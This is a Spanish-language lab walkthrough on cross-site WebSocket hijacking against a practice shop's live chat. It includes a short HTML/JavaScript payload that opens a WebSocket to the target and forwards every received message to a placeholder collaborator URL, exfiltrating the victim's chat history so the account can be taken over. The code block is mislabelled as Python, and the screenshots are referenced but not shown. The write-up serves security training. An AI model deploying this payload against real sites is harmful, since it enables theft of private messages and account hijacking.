`TAREA:` Esta tienda en línea tiene una función de chat en vivo implementada mediante WebSockets.

Para resolver el laboratorio, utilice el servidor de exploits para alojar una carga útil HTML/JavaScript que utiliza un ataque de secuestro de WebSocket entre sitios para exfiltrar el historial de chat de la víctima y luego usar esto para obtener acceso a su cuenta.

iniciamos sesión y rápidamente podemos ver que tenemos una cookie de sesión y el parámetro `Same Site` esta configurado como `None`
![[Pasted image 20250729130722.png]]

si analizamos la petición podemos ver que la solicitud del mensaje se envía al servidor haciendo un llamado a recurso `/resources/js/chat.js`
![[Pasted image 20250729134949.png]]

analizamos el json `chat.js` Ese código es un script JavaScript autoejecutable que implementa la interfaz del chat en tiempo real y utiliza la función de WebSockets
![[Pasted image 20250729135359.png]]

partiendo de esta idea podemos crear nuestra conexión web socket para exfiltrar esta información

```python
<script> 
var ws = new WebSocket('wss://your-websocket-url'); 
ws.onopen = function() { ws.send("READY"); 
}; 
ws.onmessage = function(event) { 
fetch('https://your-collaborator-url', {method: 'POST', mode: 'no-cors', body: event.data}); 
}; 
</script>
```

- **Se conecta a un servidor WebSocket**
    
    - El navegador establece una conexión con un servidor remoto (controlado por el atacante o sistema).
        
    - Esta conexión se mantiene abierta para recibir mensajes en tiempo real.
        
- **Envía una señal de "listo"**
    
    - Al establecer la conexión, el navegador envía un mensaje tipo `"READY"` para avisar que está conectado y esperando instrucciones.
        
- **Escucha mensajes entrantes**
    
    - El servidor WebSocket puede enviar mensajes al navegador.
        
- **Reenvía esos mensajes a otro servidor**
    
    - Cada mensaje recibido es automáticamente enviado (como una solicitud POST) a otra URL, bajo control del atacante. en este caso el WebSocket que hemos creado 

![[Pasted image 20250729142914.png]]

una vez realizado esto solo debemos esperar a que la victima haga clic en la solicitud para recibir la informacion
![[Pasted image 20250729142857.png]]

ahora solo nos queda limpiar nuestros mensajes y decodearlos.
![[Pasted image 20250729143812.png]]